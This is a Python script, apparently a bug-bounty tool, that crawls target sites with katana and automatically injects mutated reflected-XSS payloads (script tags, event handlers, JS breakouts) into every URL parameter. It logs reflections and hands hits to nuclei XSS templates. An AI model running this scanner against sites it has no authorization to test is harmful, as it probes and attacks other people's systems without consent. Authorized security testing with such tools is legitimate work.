import asyncio
import aiohttp
import random
import string
import json
import time
import hashlib
import subprocess
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import redis
from fastapi import FastAPI
import uvicorn
import shutil
import sys

# CLI FLAGS =========================
AUTO_MODE = "--auto" in sys.argv
HELP_MODE = "-h" in sys.argv or "--help" in sys.argv
UPDATE_MODE = "--update" in sys.argv

LOG_FILE = None
if "-f" in sys.argv:
    try:
        LOG_FILE = sys.argv[sys.argv.index("-f") + 1]
    except:
        LOG_FILE = "output.log"

# HELP =========================
def show_help():
    print("""
Usage:
  python3 boba_fett.py [options]

Options:
  --auto          Run in automatic mode (no prompts)
  --update        Check & update dependencies
  -f <file>       Save all logs to file
  -t <url>        Single target URL
  -tf <file>      Target file (wordlist of hosts/URLs)
  -h, --help      Show this help menu

Examples:
  python3 boba_fett.py
  python3 boba_fett.py -t https://target.com
  python3 boba_fett.py -tf targets.txt
  python3 boba_fett.py --update
  python3 boba_fett.py --auto --update -tf scope.txt -f output.log
""")
    exit()

if HELP_MODE:
    show_help()

# BANNER =========================
def banner():
    print(r"""
    ____        __                ______     __  __ 
   / __ )____  / /_  ____ _      / ____/__  / /_/ /_
  / __  / __ \/ __ \/ __ `/_____/ /_  / _ \/ __/ __/
 / /_/ / /_/ / /_/ / /_/ /_____/ __/ /  __/ /_/ /_  
/_____/\____/_.___/\__,_/     /_/    \___/\__/\__/   
          
Made by @GsHell0ST
    """)

# LOGGER =========================
def log(msg):
    now = datetime.now().strftime("%H:%M:%S")
    formatted = f"[{now}] - {msg}"
    print(formatted)
    if LOG_FILE:
        with open(LOG_FILE, "a") as f:
            f.write(formatted + "\n")

# INPUT HANDLER =========================
def ask(question):
    if AUTO_MODE:
        log(f"[AUTO] {question} → yes")
        return True
    return input(question + " (y/n): ").lower() == 'y'

# TOOL CHECK (ONLY WITH --update) =========================
def check_tool(name, install_cmd=None, update_cmd=None):
    if not UPDATE_MODE:
        return

    if shutil.which(name) is None:
        log(f"[MISSING] {name} not found")
        if AUTO_MODE or ask(f"Install {name}?"):
            subprocess.run(install_cmd, shell=True)
        else:
            log(f"[SKIP] {name} not installed")
    else:
        log(f"[OK] {name} found")
        if update_cmd:
            if AUTO_MODE or ask(f"Update {name}?"):
                subprocess.run(update_cmd, shell=True)

# PRE-FLIGHT CHECK =========================
def preflight():
    banner()

    if not UPDATE_MODE:
        log("[INFO] Running without dependency checks")
        return

    log("[CHECK] Verifying environment...")

    check_tool(
        "katana",
        install_cmd="wget https://github.com/projectdiscovery/katana/releases/latest/download/katana_linux_amd64.zip && unzip katana_linux_amd64.zip && chmod +x katana && sudo mv katana /usr/local/bin/"
    )

    check_tool(
        "nuclei",
        install_cmd="wget https://github.com/projectdiscovery/nuclei/releases/latest/download/nuclei_linux_amd64.zip && unzip nuclei_linux_amd64.zip && chmod +x nuclei && sudo mv nuclei /usr/local/bin/",
        update_cmd="nuclei -update-templates"
    )

    try:
        rtest = redis.Redis(host="localhost")
        rtest.ping()
        log("[OK] Redis running")
    except:
        log("[MISSING] Redis not running")
        if AUTO_MODE or ask("Start Redis?"):
            subprocess.run("sudo systemctl start redis-server", shell=True)
        else:
            log("[WARNING] Scanner may not work without Redis")

# CONFIG =========================
CONCURRENCY = 20
REDIS_HOST = "localhost"
QUEUE = "xss_queue"
RESULTS_KEY = "xss_results"
NUCLEI_RESULTS = "nuclei_results"
DEDUP_KEY = "xss_dedup"
SEEN_URLS = "seen_urls"
TARGET_FILE = "targets.txt"

TARGETS_CLI = []

if "-t" in sys.argv:
    TARGETS_CLI.append(sys.argv[sys.argv.index("-t") + 1])

if "-tf" in sys.argv:
    TARGET_FILE = sys.argv[sys.argv.index("-tf") + 1]

KATANA_INTERVAL = 3600
r = redis.Redis(host=REDIS_HOST, decode_responses=True)

# LOAD TARGETS =========================
def load_targets():
    if TARGETS_CLI:
        log(f"[TARGET] Using CLI target: {TARGETS_CLI[0]}")
        return TARGETS_CLI

    try:
        with open(TARGET_FILE) as f:
            targets = [line.strip() for line in f if line.strip()]
            log(f"[TARGET] Using file: {TARGET_FILE}")
            return targets
    except Exception as e:
        log(f"[ERROR] Failed to load targets: {e}")
        return []

# PRIORITY FILTER =========================
def prioritize(urls):
    priority, normal = [], []
    for u in urls:
        if any(k in u for k in ["login", "admin", "api"]):
            priority.append(u)
        else:
            normal.append(u)
    return priority + normal

# KATANA LOOP (ORIGINAL) =========================
async def katana_loop():
    while True:
        targets = load_targets()
        log(f"[KATANA] Targets loaded: {len(targets)}")

        for target in targets:
            log(f"[KATANA] Crawling: {target}")

            try:
                proc = subprocess.run(
                    ["katana", "-u", target, "-d", "3", "-kf", "all"],
                    capture_output=True,
                    text=True
                )

                urls = proc.stdout.splitlines()
                urls = [u for u in urls if "=" in u]
                urls = prioritize(urls)

                for url in urls:
                    if not r.sismember(SEEN_URLS, url):
                        r.sadd(SEEN_URLS, url)
                        r.rpush(QUEUE, url)

                log(f"[KATANA] {target} → {len(urls)} queued")

            except Exception as e:
                log(f"[KATANA ERROR] {e}")

        log(f"[KATANA] Sleeping {KATANA_INTERVAL}s...")
        await asyncio.sleep(KATANA_INTERVAL)

def gen_token():
    return ''.join(random.choices(string.ascii_letters, k=6))

def payloads_by_context(token):
    return {
        "html": f"<script>alert('{token}')</script>",
        "attribute": f"\" onmouseover=alert('{token}') x=\"",
        "js": f"';alert('{token}')//",
        "event": f"<img src=x onerror=alert('{token}')>"
    }

def mutate(payload):
    return random.choice([
        payload,
        payload.replace("script", "ScRiPt"),
        payload.replace("<", "%3C"),
        payload.replace(">", "%3E"),
        payload.replace("alert", "confirm"),
    ])

def is_duplicate(url, param):
    key = hashlib.md5(f"{url}-{param}".encode()).hexdigest()
    if r.sismember(DEDUP_KEY, key):
        return True
    r.sadd(DEDUP_KEY, key)
    return False

def inject(url, payload):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    for p in params:
        temp = params.copy()
        temp[p] = payload
        yield p, urlunparse(parsed._replace(query=urlencode(temp, doseq=True)))

async def fetch(session, url):
    try:
        async with session.get(url, timeout=10) as r:
            return await r.text()
    except:
        return ""

async def run_nuclei_async(url):
    try:
        proc = await asyncio.create_subprocess_exec(
            "nuclei", "-u", url, "-t", "xss/", "-json",
            stdout=asyncio.subprocess.PIPE
        )
        async for line in proc.stdout:
            r.rpush(NUCLEI_RESULTS, line.decode().strip())
        await proc.wait()
    except:
        pass

async def scan(session, url):
    token = gen_token()

    for payload in payloads_by_context(token).values():
        payload = mutate(payload)

        for param, u in inject(url, payload):
            if is_duplicate(u, param):
                continue

            resp = await fetch(session, u)

            if token in resp:
                result = {"url": u, "param": param, "payload": payload}
                log(f"[XSS FOUND] {result}")
                r.rpush(RESULTS_KEY, json.dumps(result))
                asyncio.create_task(run_nuclei_async(u))

async def worker(i):
    async with aiohttp.ClientSession() as session:
        while True:
            url = r.lpop(QUEUE)
            if not url:
                await asyncio.sleep(1)
                continue
            log(f"[Worker {i}] {url}")
            await scan(session, url)

# MAIN =========================
async def main():
    preflight()
    asyncio.create_task(katana_loop())
    tasks = [asyncio.create_task(worker(i)) for i in range(CONCURRENCY)]
    await asyncio.gather(*tasks)

# RUN =========================
if __name__ == "__main__":
    if "api" in sys.argv:
        preflight()
        uvicorn.run(FastAPI(), host="0.0.0.0", port=8000)
    else:
        asyncio.run(main())
